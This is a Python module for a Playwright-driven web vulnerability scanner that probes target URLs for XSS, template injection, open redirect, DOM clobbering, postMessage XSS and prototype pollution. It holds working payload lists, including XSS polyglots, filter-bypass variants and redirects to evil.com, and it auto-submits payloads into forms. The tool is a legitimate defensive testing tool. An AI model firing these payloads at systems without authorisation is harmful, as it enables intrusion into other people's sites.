"""Browser-powered scanner — Playwright-based DOM XSS, CSTI, stored XSS, open redirect checks."""

from __future__ import annotations

import asyncio
import logging
import re
import uuid
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from models import ScanFinding

log = logging.getLogger("proxy-engine.browser-scanner")

_XSS_PAYLOADS = [
    # Basic reflected payloads
    "<img src=x onerror=alert('pxe7k')>",
    "<svg/onload=alert('pxe7k')>",
    "\"><img src=x onerror=alert('pxe7k')>",
    "'-alert('pxe7k')-'",
    "javascript:alert('pxe7k')",
    # Event handler variations
    "<body onload=alert('pxe7k')>",
    "<input onfocus=alert('pxe7k') autofocus>",
    "<details open ontoggle=alert('pxe7k')>",
    "<marquee onstart=alert('pxe7k')>",
    "<video><source onerror=alert('pxe7k')>",
    # SVG / MathML namespace payloads
    "<svg><animate onbegin=alert('pxe7k') attributeName=x>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('pxe7k')>",
    "<svg><foreignObject><body onerror=alert('pxe7k')><img src=x>",
    # Polyglot payloads
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('pxe7k') )//",
    "\"><svg/onload=alert('pxe7k')>",
    # Encoding-bypass payloads
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('pxe7k')>",
    "<svg/onload=alert`pxe7k`>",
    # Template literal payloads
    "${alert('pxe7k')}",
    "{{constructor.constructor('alert(`pxe7k`)')()}}",
    # mXSS payloads (mutation-based)
    "<noscript><img src=x onerror=alert('pxe7k')></noscript>",
]

_CSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("{{constructor.constructor('return 1')()}}", "1"),
]


async def check_dom_xss(url: str, payloads: list[str] | None = None) -> list[ScanFinding]:
    """Inject XSS payloads via URL params, listen for dialog events in browser."""
    findings: list[ScanFinding] = []
    test_payloads = payloads or _XSS_PAYLOADS

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log.warning("[browser-scanner] Playwright not installed")
        return findings

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)

            for payload in test_payloads:
                page = await context.new_page()
                dialog_fired = False

                async def on_dialog(dialog):
                    nonlocal dialog_fired
                    if "pxe7k" in dialog.message:
                        dialog_fired = True
                    await dialog.dismiss()

                page.on("dialog", on_dialog)

                # Inject via URL parameter
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}xss={payload}"

                try:
                    await page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                    await asyncio.sleep(1)
                except Exception:
                    pass

                if dialog_fired:
                    findings.append(ScanFinding(
                        template_id="dom_xss",
                        name="DOM-Based Cross-Site Scripting",
                        severity="high",
                        url=test_url,
                        matched_at=url,
                        description=f"Browser dialog triggered with payload: {payload}",
                        source="custom",
                        confidence="confirmed",
                        remediation="Sanitize all user input before rendering in the DOM. Use textContent instead of innerHTML.",
                    ))
                    await page.close()
                    break

                await page.close()

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] DOM XSS check error: {e}")

    return findings


async def check_client_template_injection(url: str) -> list[ScanFinding]:
    """Inject template expressions, check DOM for computed results."""
    findings: list[ScanFinding] = []

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return findings

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()

            for payload, expected in _CSTI_PAYLOADS:
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}q={payload}"

                try:
                    await page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                    content = await page.content()

                    if expected in content and payload not in content:
                        findings.append(ScanFinding(
                            template_id="client_template_injection",
                            name="Client-Side Template Injection",
                            severity="medium",
                            url=test_url,
                            matched_at=url,
                            description=f"Template expression '{payload}' evaluated to '{expected}' in page DOM.",
                            source="custom",
                            confidence="confirmed",
                            remediation="Avoid rendering user input within client-side template expressions.",
                        ))
                        break
                except Exception:
                    pass

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] CSTI check error: {e}")

    return findings


async def confirm_stored_xss(url: str, inject_url: str, payload: str) -> list[ScanFinding]:
    """Submit XSS payload at inject_url, visit url, check for dialog."""
    findings: list[ScanFinding] = []

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return findings

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)

            # Step 1: Submit payload
            inject_page = await context.new_page()
            try:
                await inject_page.goto(inject_url, timeout=10000)
                # Try filling first visible input and submitting
                inputs = await inject_page.query_selector_all("input[type=text], textarea")
                for inp in inputs:
                    await inp.fill(payload)
                forms = await inject_page.query_selector_all("form")
                if forms:
                    await forms[0].evaluate("form => form.submit()")
                    await asyncio.sleep(2)
            except Exception:
                pass
            await inject_page.close()

            # Step 2: Visit target URL and check for dialog
            check_page = await context.new_page()
            dialog_fired = False

            async def on_dialog(dialog):
                nonlocal dialog_fired
                if "pxe7k" in dialog.message:
                    dialog_fired = True
                await dialog.dismiss()

            check_page.on("dialog", on_dialog)

            try:
                await check_page.goto(url, timeout=10000, wait_until="domcontentloaded")
                await asyncio.sleep(2)
            except Exception:
                pass

            if dialog_fired:
                findings.append(ScanFinding(
                    template_id="stored_xss",
                    name="Stored Cross-Site Scripting (Browser Confirmed)",
                    severity="high",
                    url=url,
                    matched_at=inject_url,
                    description=f"Stored XSS confirmed: payload injected at {inject_url} triggered dialog at {url}",
                    source="custom",
                    confidence="confirmed",
                    remediation="Sanitize and encode all user-supplied data before storing and rendering.",
                ))

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] Stored XSS check error: {e}")

    return findings


async def check_open_redirect_browser(url: str) -> list[ScanFinding]:
    """Follow redirects in browser, detect external redirect."""
    findings: list[ScanFinding] = []
    redirect_payloads = [
        "https://evil.com", "//evil.com", "/\\evil.com",
        "https://evil.com%2f%2f", "////evil.com",
    ]

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return findings

    try:
        from urllib.parse import urlparse
        base_host = urlparse(url).hostname

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)

            for payload in redirect_payloads:
                page = await browser.new_page()
                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}redirect={payload}"

                try:
                    await page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                    final_url = page.url
                    final_host = urlparse(final_url).hostname

                    if final_host and final_host != base_host and "evil.com" in final_host:
                        findings.append(ScanFinding(
                            template_id="open_redirect_browser",
                            name="Open Redirect (Browser Confirmed)",
                            severity="medium",
                            url=test_url,
                            matched_at=final_url,
                            description=f"Browser followed redirect from {base_host} to {final_host}",
                            source="custom",
                            confidence="confirmed",
                            remediation="Validate and whitelist redirect destinations. Never redirect to user-supplied URLs.",
                        ))
                        await page.close()
                        break
                except Exception:
                    pass

                await page.close()

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] Open redirect check error: {e}")

    return findings


# ── Phase 16: DOM Clobbering check ────────────────────────────────────────────

_CLOBBER_TARGETS = ["location", "cookie", "domain", "origin", "referrer", "title"]

_CLOBBER_PAYLOADS = [
    # Form + input pattern: document.{id}.{name} becomes accessible
    '<form id="{target}"><input name="value"></form>',
    # Anchor tag clobbering via name attribute
    '<a id="{target}" href="javascript:alert(1)">clobber</a>',
    # Nested form clobbering with toString override
    '<form id="{target}"><button name="value">clobber</button></form>',
]


async def check_dom_clobbering(url: str) -> list[ScanFinding]:
    """Inject DOM clobbering payloads via URL params and check if document properties are overwritten."""
    findings: list[ScanFinding] = []

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log.warning("[browser-scanner] Playwright not installed")
        return findings

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)

            for target in _CLOBBER_TARGETS:
                for payload_template in _CLOBBER_PAYLOADS:
                    payload = payload_template.format(target=target)
                    page = await context.new_page()

                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}clobber={payload}"

                    try:
                        await page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                        await asyncio.sleep(0.5)

                        # Check if the document property was clobbered to an HTML element
                        is_clobbered = await page.evaluate(f"""() => {{
                            try {{
                                const el = document['{target}'];
                                // If the property is now an HTMLElement, it was clobbered
                                return (el instanceof HTMLElement || el instanceof HTMLCollection);
                            }} catch (e) {{
                                return false;
                            }}
                        }}""")

                        if is_clobbered:
                            findings.append(ScanFinding(
                                template_id="dom_clobbering",
                                name="DOM Clobbering",
                                severity="medium",
                                url=test_url,
                                matched_at=url,
                                description=(
                                    f"DOM clobbering confirmed: document.{target} was overwritten by injected HTML element. "
                                    f"Payload: {payload}"
                                ),
                                source="custom",
                                confidence="confirmed",
                                remediation=(
                                    "Use Object.freeze on critical document properties. "
                                    "Avoid relying on named DOM element access. "
                                    "Sanitize user input to strip id/name attributes."
                                ),
                            ))
                            await page.close()
                            # Found clobbering for this target, move to next target
                            break
                    except Exception:
                        pass

                    await page.close()

                # Stop after first confirmed finding to avoid noise
                if findings:
                    break

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] DOM Clobbering check error: {e}")

    return findings


# ── Phase 16: postMessage XSS check ──────────────────────────────────────────

_POSTMESSAGE_PAYLOADS = [
    "<img src=x onerror=alert('pxe7k')>",
    "javascript:alert('pxe7k')",
    '{"type":"xss","data":"<img src=x onerror=alert(\'pxe7k\')>"}',
    '{"__proto__":{"innerHTML":"<img src=x onerror=alert(\'pxe7k\')>"}}',
    "<script>alert('pxe7k')</script>",
]


async def check_postmessage_xss(url: str) -> list[ScanFinding]:
    """Enumerate postMessage handlers and attempt XSS via crafted messages."""
    findings: list[ScanFinding] = []

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log.warning("[browser-scanner] Playwright not installed")
        return findings

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)
            page = await context.new_page()

            try:
                await page.goto(url, timeout=10000, wait_until="domcontentloaded")
                await asyncio.sleep(1)
            except Exception:
                await browser.close()
                return findings

            # Enumerate message event listeners on the page
            has_message_handler = await page.evaluate("""() => {
                // Check for message listeners by looking at window event listeners
                // Use getEventListeners if available (Chrome DevTools protocol)
                // Fallback: override addEventListener before page load is ideal,
                // but we can check if postMessage is used by inspecting scripts
                let found = false;

                // Method 1: Check if any scripts contain addEventListener('message'
                const scripts = document.querySelectorAll('script');
                for (const s of scripts) {
                    if (s.textContent && s.textContent.includes("addEventListener") &&
                        s.textContent.includes("message")) {
                        found = true;
                        break;
                    }
                }

                // Method 2: Check inline event handlers
                if (window.onmessage !== null && window.onmessage !== undefined) {
                    found = true;
                }

                return found;
            }""")

            if not has_message_handler:
                # No message handlers detected, nothing to test
                await browser.close()
                return findings

            # Found message handlers — try sending crafted postMessage payloads
            for payload in _POSTMESSAGE_PAYLOADS:
                dialog_fired = False

                async def on_dialog(dialog):
                    nonlocal dialog_fired
                    if "pxe7k" in dialog.message:
                        dialog_fired = True
                    await dialog.dismiss()

                page.on("dialog", on_dialog)

                try:
                    # Send postMessage from the page context itself (same-origin)
                    await page.evaluate(f"""(payload) => {{
                        window.postMessage(payload, '*');
                    }}""", payload)
                    await asyncio.sleep(1)

                    # Also try sending as a parsed JSON object
                    try:
                        await page.evaluate("""(payload) => {
                            try {
                                window.postMessage(JSON.parse(payload), '*');
                            } catch(e) {
                                // payload is not JSON, already sent as string above
                            }
                        }""", payload)
                        await asyncio.sleep(0.5)
                    except Exception:
                        pass

                except Exception:
                    pass

                page.remove_listener("dialog", on_dialog)

                if dialog_fired:
                    findings.append(ScanFinding(
                        template_id="postmessage_xss",
                        name="postMessage-Based Cross-Site Scripting",
                        severity="high",
                        url=url,
                        matched_at=url,
                        description=(
                            f"XSS triggered via postMessage handler. "
                            f"The page has a message event listener that processes attacker-controlled data unsafely. "
                            f"Payload: {payload}"
                        ),
                        source="custom",
                        confidence="confirmed",
                        remediation=(
                            "Validate the origin of incoming postMessage events. "
                            "Never use innerHTML or eval() on postMessage data. "
                            "Use a strict allowlist for expected message origins."
                        ),
                    ))
                    break

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] postMessage XSS check error: {e}")

    return findings


# ── Phase 16: Client-Side Prototype Pollution check ───────────────────────────

_PROTO_POLLUTION_PARAMS = [
    ("__proto__[polluted]", "pxe7k"),
    ("__proto__.polluted", "pxe7k"),
    ("constructor[prototype][polluted]", "pxe7k"),
    ("constructor.prototype.polluted", "pxe7k"),
]

# Additional fragment-based pollution vectors
_PROTO_POLLUTION_FRAGMENTS = [
    "#__proto__[polluted]=pxe7k",
    "#constructor[prototype][polluted]=pxe7k",
]


async def check_prototype_pollution_client(url: str) -> list[ScanFinding]:
    """Inject prototype pollution payloads via query params and fragments, check if Object prototype is polluted."""
    findings: list[ScanFinding] = []

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log.warning("[browser-scanner] Playwright not installed")
        return findings

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(ignore_https_errors=True)

            # Test query parameter pollution vectors
            for param_name, param_value in _PROTO_POLLUTION_PARAMS:
                page = await context.new_page()

                sep = "&" if "?" in url else "?"
                test_url = f"{url}{sep}{param_name}={param_value}"

                try:
                    await page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                    await asyncio.sleep(1)

                    is_polluted = await page.evaluate("""() => {
                        try {
                            const obj = {};
                            return obj.polluted === 'pxe7k' || obj['polluted'] === 'pxe7k';
                        } catch (e) {
                            return false;
                        }
                    }""")

                    if is_polluted:
                        findings.append(ScanFinding(
                            template_id="prototype_pollution_client",
                            name="Client-Side Prototype Pollution",
                            severity="high",
                            url=test_url,
                            matched_at=url,
                            description=(
                                f"Prototype pollution confirmed: ({{}}).polluted === 'pxe7k' after injecting "
                                f"{param_name}={param_value} via query parameter. "
                                f"Attacker can modify Object.prototype to affect application logic."
                            ),
                            source="custom",
                            confidence="confirmed",
                            remediation=(
                                "Use Object.create(null) for lookup objects. "
                                "Freeze Object.prototype. "
                                "Sanitize user input keys — reject __proto__, constructor, prototype."
                            ),
                        ))
                        await page.close()
                        break
                except Exception:
                    pass

                await page.close()

                if findings:
                    break

            # If no query param vector worked, try fragment-based pollution
            if not findings:
                for fragment in _PROTO_POLLUTION_FRAGMENTS:
                    page = await context.new_page()

                    # Strip existing fragment if any
                    base = url.split("#")[0]
                    test_url = f"{base}{fragment}"

                    try:
                        await page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                        await asyncio.sleep(1)

                        is_polluted = await page.evaluate("""() => {
                            try {
                                const obj = {};
                                return obj.polluted === 'pxe7k' || obj['polluted'] === 'pxe7k';
                            } catch (e) {
                                return false;
                            }
                        }""")

                        if is_polluted:
                            findings.append(ScanFinding(
                                template_id="prototype_pollution_client",
                                name="Client-Side Prototype Pollution (Fragment)",
                                severity="high",
                                url=test_url,
                                matched_at=url,
                                description=(
                                    f"Prototype pollution confirmed via URL fragment: {fragment}. "
                                    f"({{}}).polluted === 'pxe7k' after page load. "
                                    f"Attacker can modify Object.prototype through fragment-based parameter parsing."
                                ),
                                source="custom",
                                confidence="confirmed",
                                remediation=(
                                    "Use Object.create(null) for lookup objects. "
                                    "Freeze Object.prototype. "
                                    "Sanitize user input keys — reject __proto__, constructor, prototype."
                                ),
                            ))
                            await page.close()
                            break
                    except Exception:
                        pass

                    await page.close()

            await browser.close()
    except Exception as e:
        log.warning(f"[browser-scanner] Prototype pollution check error: {e}")

    return findings


# ── Phase 16: Source Map Disclosure check ─────────────────────────────────────

_SOURCEMAP_PATTERN = re.compile(r"//[#@]\s*sourceMappingURL\s*=\s*(\S+)")


async def check_sourcemap_disclosure(url: str) -> list[ScanFinding]:
    """Fetch page, extract JS file URLs, check for accessible source map files."""
    findings: list[ScanFinding] = []

    try:
        import httpx
    except ImportError:
        log.warning("[browser-scanner] httpx not installed — skipping sourcemap check")
        return findings

    try:
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10.0) as client:
            # Fetch the main page to extract script URLs
            resp = await client.get(url)
            page_text = resp.text

            # Extract all script src URLs from the page
            script_urls: list[str] = []
            for match in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', page_text, re.IGNORECASE):
                src = match.group(1)
                if src.startswith("//"):
                    src = "https:" + src
                elif src.startswith("/"):
                    parsed = urlparse(url)
                    src = f"{parsed.scheme}://{parsed.netloc}{src}"
                elif not src.startswith("http"):
                    # Relative URL — resolve against page URL
                    base = url.rsplit("/", 1)[0]
                    src = f"{base}/{src}"
                script_urls.append(src)

            # Also check inline scripts and the page itself for sourceMappingURL
            all_sources = [(url, page_text)] + [(su, None) for su in script_urls]

            checked_maps: set[str] = set()

            for source_url, content in all_sources:
                if content is None:
                    try:
                        js_resp = await client.get(source_url)
                        if js_resp.status_code != 200:
                            continue
                        content = js_resp.text
                    except Exception:
                        continue

                # Search for sourceMappingURL in the content
                for sm_match in _SOURCEMAP_PATTERN.finditer(content):
                    map_path = sm_match.group(1).strip()

                    # Resolve the map URL
                    if map_path.startswith("data:"):
                        # Inline source map — still a disclosure
                        findings.append(ScanFinding(
                            template_id="sourcemap_disclosure",
                            name="Inline Source Map Disclosure",
                            severity="low",
                            url=source_url,
                            matched_at=source_url,
                            description=(
                                f"Inline source map found via data: URI in {source_url}. "
                                f"This exposes original source code to anyone inspecting the JavaScript."
                            ),
                            source="custom",
                            confidence="confirmed",
                            remediation="Remove sourceMappingURL comments from production JavaScript files.",
                        ))
                        continue

                    if map_path.startswith("//"):
                        map_url = "https:" + map_path
                    elif map_path.startswith("http"):
                        map_url = map_path
                    elif map_path.startswith("/"):
                        parsed = urlparse(source_url)
                        map_url = f"{parsed.scheme}://{parsed.netloc}{map_path}"
                    else:
                        base = source_url.rsplit("/", 1)[0]
                        map_url = f"{base}/{map_path}"

                    if map_url in checked_maps:
                        continue
                    checked_maps.add(map_url)

                    # Try to fetch the source map
                    try:
                        map_resp = await client.get(map_url)
                        if map_resp.status_code == 200:
                            content_type = map_resp.headers.get("content-type", "")
                            body = map_resp.text[:500]
                            # Validate it looks like a real source map (JSON with "mappings" key)
                            if '"mappings"' in body or '"sources"' in body or "application/json" in content_type:
                                findings.append(ScanFinding(
                                    template_id="sourcemap_disclosure",
                                    name="JavaScript Source Map Disclosure",
                                    severity="low",
                                    url=map_url,
                                    matched_at=source_url,
                                    description=(
                                        f"Accessible source map file found: {map_url} "
                                        f"(referenced from {source_url}). "
                                        f"Source maps expose original, unminified source code including "
                                        f"comments, variable names, and application logic."
                                    ),
                                    source="custom",
                                    confidence="confirmed",
                                    remediation=(
                                        "Remove sourceMappingURL comments from production JS. "
                                        "If source maps are needed for error tracking, restrict access to authenticated users only."
                                    ),
                                ))
                    except Exception:
                        pass

    except Exception as e:
        log.warning(f"[browser-scanner] Source map disclosure check error: {e}")

    return findings


# ── Check registry for scanner integration ───────────────────────────────────

BROWSER_CHECKS = {
    "dom_xss": check_dom_xss,
    "client_template_injection": check_client_template_injection,
    "stored_xss_confirm": confirm_stored_xss,
    "open_redirect_browser": check_open_redirect_browser,
    "dom_clobbering": check_dom_clobbering,
    "postmessage_xss": check_postmessage_xss,
    "prototype_pollution_client": check_prototype_pollution_client,
    "sourcemap_disclosure": check_sourcemap_disclosure,
}
